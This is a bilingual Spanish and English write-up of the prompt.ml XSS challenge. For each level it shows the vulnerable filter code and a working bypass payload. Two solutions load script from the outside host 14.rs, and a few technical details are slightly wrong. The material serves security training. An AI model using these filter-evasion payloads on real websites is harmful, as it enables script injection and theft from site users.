# prompt.ml
16-Level XSS challenge
:es: :uk:

## Index
* [Level 0](#Level-0)
* [Level 1](#Level-1)
* [Level 2](#Level-2)
* [Level 3](#Level-3)
* [Level 4](#Level-4)
* [Level 5](#Level-5)
* [Level 6](#Level-6)
* [Level 7](#Level-7)
* [Level 8](#Level-8)
* [Level 9](#Level-9)
* [Level A](#Level-A)
* [Level B](#Level-B)
* [Level C](#Level-C)
* [Level D](#Level-D)
* [Level E](#Level-E)
* [Level F](#Level-F)


## [Level 0]
:es: Primer ejercicio, hay que escapar las comillas ya que no se sanitiza el texto, para introducir el script que queramos ejecutar.
:uk: First exercise, we have to escape the quotes because it's not sanitized, for injecting the script we want to run.

### Code
```
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}       
```

### Solution
:es: Escapamos las comillas y a continuación usamos `svg` con el `onload` para hacer `prompt`<br>
:uk: We escape quotes and basically we use `svg`with the `onload` for doing the `prompt`

`"><svg onload=prompt(1)>`
or
`"><script>prompt(1)>` 

>[Top](#index)

## [Level 1]
:es: Añaden una función de la librería `ExtJS`, se "sanitiza" el texto, removiendo cualquier tag que indique cualquier tag, es decir `<foo>` lo reemplaza por ``.
Esto es debido a `var stripTagsRE = /<\/?[^>]+>/gi;` regex que indica cualquier texto formado por un < y cerrado por >, con tag general, ignorando mayúsculas.
Usando `svg` no hace falta cerar el script con `>`, simplemente podemos poner un espacio o un salto de linea.


:uk: There's this stripping mechanism from `ExtJS` library, sanitizing the test, which takes whatever tag-type input that we add, i.e `<foo>` and just puts an empty string in its place, making "impossible" to execute code.
Using `svg`, we don't have to close the tag at all with `>`, we can just add an space or a linebreak.

### Code
```
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}
```

### Solution
`<svg onload=prompt(1) `

>[Top](#index)

## [Level 2]
:es: En este nivel, tenemos un replace que elimina cualquier `=` o `(` que metamos en el input, para saltarlo usamos `svg`, seguido del script con la representación html de `(` es decir `&#40;`, esto funciona porque lo que "metemos" dentro svg, se va representar en su forma original, es decir, como un `(`.

:uk: In this level, we have a replace which removes every `=` or `(` in our input, for circumventing this, we use `svg`, and then we put the script with the `(` in html representation, i.e `&#40;` the magic of this method is that inside `svg`, it gets is canonical representation.

### Code
```
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}  
```

### Solution
`<svg><script>prompt&#40;1)</script>`

>[Top](#index)


## [Level 3]
:es: Con este code evitan que hagamos `-->` para cerrar el comentario, pero `--!>` también cierra el comentario, aunque de un error de parseo, pero se puede ejecutar el script igual.


:uk: With this code, they thwart the usage of `-->` to close the comment, but we can use `--!>` which, even giving a parse error, successfully closes the comment, letting us injecting the script.

### Code
``` 
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}        
```

### Solution
`--!><svg onload=prompt(1)>`

>[Top](#index)

## [Level 4]
:es: Tenemos que ejecutar el script desde una página, ya que el regex en el if comprueba que la url contenga `http(s)://prompt.ml/`, además, la función `decodeURIComponent` trabaja sobre una URL encodeada y lo transforma a la representación canónica y además tenemos que la web `14.rs` promptea 1.

Sabiendo esto, tendremos que, meter la dirección de prompt.ml como si fuera user:password y además escribir el `/` como `%2f` (su encoded), de esta manera, el if verá `https://prompt.ml/` cuando en realidad estaremos haciendo `https://prompt.ml%2f@14.rs`, lo que el browser interpretará como, ve a `14.rs` y mete como user `prompt.ml%2f`.

:uk: We have to execute the script from another webpage, but making it look that we're still in the same host, the conditional statement checks that the URL is composed of `http(s)://prompt.ml/`, being also decoded from URL to canoninc representation using `decodeURIComponent`, we will be using website `14.rs` for the attack, which prompts(1) by default.

Knowing this, we'll have to put `prompt.ml` as the user:password field in the url, tricking the system to think that we're still at `prompt.ml/`, where in reality, using `https://prompt.ml%2f@14.rs`, the code will see a legit request to `prompt.ml/`, whereas the browser won't decode that `%2f`, thus using user `prompt.ml%2f` @ (at) `14.rs`, doing the request successfully.

### Code
```
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}
```

### Solution
`https://prompt.ml%2f@14.rs`

### Note
This won't work in Chrome as it's fixed, but on Firefox does work.

>[Top](#index)

## [Level 5]
:es: En este quinto nivel, tenemos un regex que evita que usemos `>`, cualquier tipo de `onload=` `onresize=` y cualquier `focus`, sustituyéndolos por `_`.

Además transforma el input a `text`, pero podemos cambiarlo a `image`, ya que siempre utilizará el primero que encuentre, descartando los demás.

Este regex no comprueba bien los multilínea, por lo que simplemente haciendo un salto de linea podemos escribir cosas tipo `onload<br>=`.

:uk: We have a regex which foils usage of `>`, every type of `onload=`, `onresize=` and `focus`, substituting them with `_`.

Also it sets the type to `text`, but we can change this type because the broswer will get the first one it sees, discarding next ones.

This regex won't check multilines, so we can just use breaks to hide the `onload<br>=` and such.

### Code
```
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}       
```

### Solution
```
type=image src=x onerror
="prompt(1)
```

>[Top](#index)

## [Level 6]
:es: Haciendo DOM clobbering, "sobreescribimos" el value de `action` con `1`, con lo que ya podemos ejecutar lo que tenemos en `javascript:prompt(1)`

:uk: Doing DOM clobbering, we change the action value, thus we can execute the command.

### Code
```
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}        

```

### Solution
`javascript:prompt(1)#{"action":1}`

>[Top](#index)

## [Level 7]
:es: En este nivel tenemos un tag que se va autogenerando por cada `#` con el que separemos, el cuál solo puede tener 12 chars como máximo.

No hay ningún carácter limitado, por lo que podemos escapar el title con un `"` para a continuación crear nuestro propio tag `<script>` y escribir nuestro code, como el límite está en 12 chars, nuestra inyección no cabe, por lo que tenemos que hacerlo en varias partes, usando `#`, para hacer esto, comentamos el resto de la tag para que a ojos del browser quede como `"><script>/*junk*/prompt(1)/*junk*/</script>`, (comentamos usando `/*` y `*/`.

:uk: In this level we have a tag which gets autogenerated every `#`, which can has only 12 chars at max.

There's no char restriction, so we can just escape this tag with `"` and create a new tag `<script>` and then start injecting our code, as the limit per tag is 12 chars, we have to split the code several times using `#`, we will comment the rest of the tag so it doesn't interfere with our new tag, this way it will look like `"><script>/*junk*/prompt(1)/*junk*/</script>`, (we comment using `/*` and `*/`.

### Code
```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}        
```

### Solution
`"><script>/*#*/prompt(1/*#*/)</script>`

>[Top](#index)

## [Level 8]
:es: Aquí, podemos observar que tenemos una función comentada `// console.log...`, dentro de un `<script>` tag, tenemos capados los saltos de linea `\n` y los carriage return `\r`, nuestra misión es conseguir meter un salto de linea para meter nuestro script y a ocntinuación comentar el final del comentario, para que quede de esta manera:

```
// console.log("'\n
prompt(1)\n
// '");
```

Pero claro, no podemos ni usar `\n` ni `/` para comentar, lo que sí que podemos hacer es inyectar el unicode char de line feed `U+2028`, el cuál no es capado por el regex, y para comentar `'");" podemos usar `-->` de manera que quedaría así.

```
// console.log("'[u+2028]
prompt(1)[u+2028]
--> '");
```

:uk: We have a commented function `// console.log...`, inside a `<script>` tag, we can't use `\n` line breaks, or carriage return `\r`, our goal is to inject somehow a linebreak to break the comment (is a one liner comment), write our code, then line break again and comment the junk at the end `'");`, this way we would have something like this.

```
// console.log("'\n
prompt(1)\n
// '");
```

But we can't use neither `\n` or `/`, what we can do here is to inject the unicode values directly into the code as it will get accepted and not replaced by the regex, the unicode value for a line feed is `U+2028`, and for commenting out the junk, we can use `-->`.

This way we should have something like this

```
// console.log("'[u+2028]
prompt(1)[u+2028] 
--> '");
```

### Code
```
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}        
```

### Solution
`[u+2028]prompt(1)[u+2028]-->`

>[Top](#index)

## [Level 9]
:es: El regex de este code caza cualquier `<x` donde `x` sea cualquier letra `[a-ZA-Z]`, la vulnerabilidad está en la función de js `toUpperCase`, que ciertos carácteres unicode los "pasa" a mayúscula incorrectamente, lo que nos da ciertas letras, por ejemplo la letra `ſ` se transforma en `S`, con lo que podemos abrir un tag `<SCRIPT>`, ya que el regex verá `<ſ` lo que no cumple la condición de que sea una letra, pero una vez llegue a la función `.toUpperCase`, quedará `<S`.

Al estar todo en mayúsculas, si ponemos un `prompt(1)` no funcionará ya que tiene que estar en minúsculas, por lo que cargamos el script via `href` desde una página externa, en este caso `14.rs`.

:uk: This regex looks for any `<x` where `x` is any letter `[a-zA-Z]`, this vulnerability relies in the js function `.toUpperCase`, which allows certain Unicode chars to be "translated" to upper case incorrectly, showing certaing letters, for example the char `ſ` switches to `S`, this way we can open a tag `<SCRIPT>`, cause the regex will see `<ſ`, thus not being replaced by its condition, but when it gets to the `.toUpperCase` function, it will look like `<S`.

Also, as everything will be in upper case, we can't use `prompt(1)` cause it has to be in lowercase, so we just load the script via `href` using an external web, in this case `14.rs`.

### Code
```
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}     
```

### Solution
`<ſvg><ſcript href=//14.rs`
 
>[Top](#index)

## [Level A]
:es: Este es sencillo, tenemos primero un `replace` que coge cualquier `prompt` y lo convierte en `alert`, y a continuación borrar cualquier `'`, de esta manera, si escribimos `promp't`, el primer replace no detecta la palabra, y una vez llega al segundo replace, quita la coma, quedando nuestro `prompt`.

:uk: This one is easy, in the first `replace`, it takes any `prompt` and changes it to `alert` then in the second one, it removes any `'`, this way, if we write `promp't`, it won't trigger the first replace, and the second replace will help us removing the `'` giving us a clean `prompt`.

### Code
```
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}   
```

### Solution
`promp't(1)`

>[Top](#index)

## [Level B]
:es: No podemos usar ningún char especial, pero podemos usar `in` para "checkear" el code que metemos dentro, después de haber escapado del string con `"`, de esta forma conseguimos ejecutarlo.

:uk: We can't use any special char, but we can use `in` for "checking" the code that we put inside, after escaping the quotes with `"`, this way we can execute it.

### Code
```


function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}        
```

### Solution
`"(prompt(1))in"`

>[Top](#index)

## [Level C]
:es: En este nivel, tenemos `encodeURIComponent`, que va a codear la mayoría de carácteres de interés como `<"'` por sus representaciones, pero no influye ni en `()` ni en `.` por lo que podemos llamar a alguna función de js directamente.

Con la función `parseInt(x, y)` convertimos un string `x` a su representación numérica en base `y`,para nuestro caso, sabemos que `base36` contiene las representaciones de los alfanuméricos `a-z0-9`por lo que usaremos `base36` de esta forma `parseInt("prompt", 36)`, de este modo conseguimos el número `1558153217` que es la representación en `base36` de `prompt`, ya nos hemos saltado una parte de la defensa, al introducirlo de esta manera, los replaces van a ver el número en vez de prompt, ya que el retorno del número al string se producirá a posteriori, una vez ya esté insertado en el tag `<script>`.

Para volver de número a su representación en string hacemos `eval` sobre `.toString(x)` siendo `x` la base, en este caso, 36.

:uk: In this level, we have `encodeURIComponent`, which codes the majority of chars that interest us, but it doesn't affect `()` or `.`, this way we can call js functions directly.

With the function `parseInt(x, y)` we convert a string `x` to its numeric representation in base `y`, in our case, we knw that `bae36` contains the representation for alphanumberic chars such as `a-z0-9` s we will use `base36` in this way `parseInt("prompt", 36)`,  this way we will get the number `1558153217` which is the representation in `base36` of `prompt`, we have bypassed this defense already, cause replaces won't see the string "prompt", instead they will see the number cause the conversion takes place after that check.

For getting back to the string, we `eval` the `.toString(x)` being `x` the base, in this case, 36.

### Code
```
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}        
```

### Solution
`eval((1558153217).toString(36))(1)`

>[Top](#index)

## [Level D]
:es: Este es algo complicado, por un lado tenemos un `JSON.parse` que sanitiza el input que metamos y además se hace un regex al value de "source" para ver si es una web, si no, la borra y da un error.

Tenemos que usar la propiedad `__proto__` que hace de "accessor", permitiendo acceder al json de dentro, sin "sufrir" el regex, de esta forma saltamos la comprobación.

:uk: This is a bit complicated, we have a `JSON.parse` that sanitizes the input and also does a regex on the value of `source` to check wether is a web or not, if not, it deletes it and yields an error.

We have to use the property `__proto__`, this way we can access the json from inside the brackets without having to pass the regex, this way we can skip it.

### Code
```
function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}       
```

### Solution
`{"source": "--", "__proto__": {"source": "$`onerror=prompt(1)>"}}`

>[Top](#index)

## [Level E]

### No solution

## [Level F]
:es: Este nivel es similar al nivel 7, pero en este caso no podemos comentar en js, ya que el regex prohibe dichos comentarios, por lo que tenemos que usar comentarios de XML para poder hacerlos, tenemos primero que insertar un `<svg>` y hacer como antes.

:uk: This level is similar to level 7, but here we can't use js comments, cause the regex limits this usage, but we can use XML comments, for doing this, we have to insert a `<svg>` tag before. 

### Code
```
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}    
```

## Solution
```
"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</

```
>[Top](#index)

[Level 0]: http://prompt.ml/0
[Level 1]: http://prompt.ml/1
[Level 2]: http://prompt.ml/2
[Level 3]: http://prompt.ml/3
[Level 4]: http://prompt.ml/4
[Level 5]: http://prompt.ml/5
[Level 6]: http://prompt.ml/6
[Level 7]: http://prompt.ml/7
[Level 8]: http://prompt.ml/8
[Level 9]: http://prompt.ml/9
[Level A]: http://prompt.ml/10
[Level B]: http://prompt.ml/11
[Level C]: http://prompt.ml/12
[Level D]: http://prompt.ml/13
[Level E]: http://prompt.ml/14
[Level F]: http://prompt.ml/15

